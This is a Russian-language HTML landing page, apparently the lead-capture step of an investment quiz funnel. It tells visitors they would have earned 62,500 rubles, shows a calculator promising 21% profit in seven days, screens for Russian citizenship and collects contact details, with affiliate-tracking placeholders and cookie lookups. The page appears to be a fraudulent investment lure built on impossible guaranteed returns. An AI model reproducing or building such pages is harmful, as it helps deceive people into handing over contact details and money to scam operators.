<!DOCTYPE html>
<!--  This site was created in Webflow. https://webflow.com  --><!--  Last Published: Wed Jan 08 2025 16:11:15 GMT+0000 (Coordinated Universal Time)  -->
<html
  data-wf-page="65450e02b09296dd34073b4c"
  data-wf-site="652f88b20bb4d9041f52bfc1"
>
  <head>
    <meta charset="utf-8" />
    <title>Form</title>
    <meta content="Form" property="og:title" />
    <meta content="Form" property="twitter:title" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <meta content="Webflow" name="generator" />
    <link href="css/normalize.css" rel="stylesheet" type="text/css" />
    <link href="css/webflow.css" rel="stylesheet" type="text/css" />
    <link
      href="css/quiz-sber-phone.webflow.css"
      rel="stylesheet"
      type="text/css"
    />
    <link rel="shortcut icon" href="./images/favicon.svg" type="image/x-icon">
    <link href="https://fonts.googleapis.com" rel="preconnect" />
    <link
      href="https://fonts.gstatic.com"
      rel="preconnect"
      crossorigin="anonymous"
    />
    <script
      src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"
      type="text/javascript"
    ></script>
    <script type="text/javascript">
      WebFont.load({
        google: { families: ["Inter:200,300,regular,500,600,700,800"] },
      });
    </script>
    <script type="text/javascript">
      !(function (o, c) {
        var n = c.documentElement,
          t = " w-mod-";
        (n.className += t + "js"),
          ("ontouchstart" in o ||
            (o.DocumentTouch && c instanceof DocumentTouch)) &&
            (n.className += t + "touch");
      })(window, document);
    </script>
    <link href="images/favicon.png" rel="shortcut icon" type="image/x-icon" />
    
    <script src="jquery-3.6.1.min.js"></script>

    <script src="form/js/libs/intlTelInput.js"></script>
    
    <script type="application/javascript" src="track.js?v=2332"></script>

    <script type="application/javascript">
    
        function getCookie(name) {
          var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
          return v ? v[2] : null;
        }

        // Получаем значение 'subid' из куки
        const subid_1 = getCookie("_subid");
        
        const infoFromCookie = getCookie("info");
      
        var offerData = {
          subid: subid_1,
          buyer: "{buyer}",
          crm_campaign: "{crm_campaign}",
          thank_you_page: "{thank_you_page}",
          landing_name: "offer_id_" + "{offer_id}",
          app_key: "{app_key}",
          bge: "{bge}",
          ts_id: "{ts_id}",
          info: infoFromCookie,
        };
    </script>

    
    <script type="application/javascript" src="parse_url.js?v=233432"></script>
    
    
  </head>
  <body class="body">
    <section class="section-3">
      <div class="div-block-33">
        <img
          src="images/logo.svg"
          loading="lazy"
          alt=""
          class="image-5"
        />
        <div class="div-block-57">
          <div class="div-block-52">
            <h3 class="text-block-2">Поздравляем!</h3>
            <div class="text-block-23">
              У Вас отличное понимание рынка: будь это настоящие сделки, Вы бы заработали 
              <span class="text-span-5">62 500 руб.</span>
            </div>
          </div>
          <div class="div-block-16">
            <div class="text-block-6">Спасибо! Для завершения оставьте свои контактные данные!</div>
            <div class="form-block w-form">
              <form
                class="form _main-form contact-form freg thin rounded"
                id="main-form"
                method="post"
              ></form>
            </div>
          </div>
          <div class="div-block-39" id="calculator">
  <div class="div-block-35">
    <div class="div-block-55">
      <h3 class="text-block-5">Рассчитайте свою прибыль:</h3>
      <div class="div-block-47">
        <div class="text-block-16">Сумма инвестиций:</div>
        <div class="div-block-56">
          <div class="div-block-51">
            <div class="div-block-48">
              <div id="investment-value" class="text-block-20">9 500 ₽</div>
            </div>
            <div class="div-block-48 gray">
              <div class="text-block-20 gray">200 000+ ₽</div>
            </div>
          </div>
          <input
            id="investment-slider"
            type="range"
            min="9500"
            max="200000"
            value="9500"
            step="500"
          />
          <div class="div-block-50">
            <div class="text-block-21">9 500</div>
            <div class="text-block-21">57 125</div>
            <div class="text-block-21">104 750</div>
            <div class="text-block-21">152 375</div>
            <div class="text-block-21">200 000</div>
          </div>
        </div>
      </div>
      <div class="div-block-42">
        <div class="text-block-16">Выберите срок инвестирования:</div>
        <div class="investment-period div-block-38">
          <button data-period="7" class="div-block-37 active">
            <div class="text-block-19 white">7 дней</div>
          </button>
          <button data-period="14" class="div-block-37">
            <div class="text-block-19">14 дней</div>
          </button>
          <button data-period="28" class="div-block-37">
            <div class="text-block-19">28 дней</div>
          </button>
          <button data-period="56" class="div-block-37">
            <div class="text-block-19">56 дней</div>
          </button>
        </div>
      </div>
      <div class="div-block-40">
        <div class="div-block-43">
          <div class="text-block-16">Прибыль:</div>
          <div id="profit-value" class="text-block-18">1 995 ₽</div>
        </div>
        <div class="div-block-44">
          <div class="text-block-16">В процентах:</div>
          <div id="percentage-value" class="text-block-18">21%</div>
        </div>
        <div class="div-block-45">
          <div class="text-block-16">Итого:</div>
          <div id="total-value" class="text-block-18 black">11 495 ₽</div>
        </div>
      </div>
    </div>
  </div>
</div>

          <div class="div-block-35-copy">
            <div class="div-block-55">
              <h3 class="text-block-5">Рассчитайте свою прибыль:</h3>
              <div class="div-block-47">
                <div class="text-block-16">Сумма инвестиций:</div>
                <div class="div-block-56">
                  <div class="div-block-51">
                    <div class="div-block-48">
                      <div class="text-block-20">9 500 ₽</div>
                    </div>
                    <div class="div-block-48 gray">
                      <div class="text-block-20 gray">200 000+ ₽</div>
                    </div>
                  </div>
                  <div class="div-block-49">
                    <div class="div-block-46"></div>
                    <div class="div-block-36"></div>
                  </div>
                  <div class="div-block-50">
                    <div class="text-block-21">9 500</div>
                    <div class="text-block-21">57 125</div>
                    <div class="text-block-21">104 750</div>
                    <div class="text-block-21">152 375</div>
                    <div class="text-block-21">200 000</div>
                  </div>
                </div>
              </div>
              <div class="div-block-42">
                <div class="text-block-16">Выберите срок инвестирования:</div>
                <div class="div-block-38">
                  <div class="div-block-37 active">
                    <div class="text-block-19 white">7 дней</div>
                  </div>
                  <div class="div-block-37">
                    <div class="text-block-19">14 дней</div>
                  </div>
                  <div class="div-block-37">
                    <div class="text-block-19">28 дней</div>
                  </div>
                  <div class="div-block-37">
                    <div class="text-block-19">56 дней</div>
                  </div>
                </div>
              </div>
              <div class="div-block-40">
                <div class="div-block-43">
                  <div class="text-block-16">Прибыль:</div>
                  <div class="text-block-18">1 995 ₽</div>
                </div>
                <div class="div-block-44">
                  <div class="text-block-16">В процентах:</div>
                  <div class="text-block-18">21%</div>
                </div>
                <div class="div-block-45">
                  <div class="text-block-16">Итого:</div>
                  <div class="text-block-18 black">11 495 ₽</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <div data-w-id="e9820a22-0140-2f72-7978-ffd1a3c5d01c" class="popup">
      <div class="div-block-60">
        <div class="text-block-25">
          Вы являетесь гражданином Российской Федерации?
        </div>
        <div class="div-block-62">
          <a
            data-w-id="0a3c092d-acde-6668-2977-908fc16109f1"
            href="thanks-page.html"
            class="button-4 w-button"
            >Да</a
          >
          <a href="ban-page.html" class="button-5 w-button">Нет</a>
        </div>
      </div>
    </div>

    <script src="./js/calc.js" type="module"></script>
    <script src="js/webflow.js" type="text/javascript"></script>
     <script src="loadAssets.js?v=6535"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'ban-page.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'ban-page.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
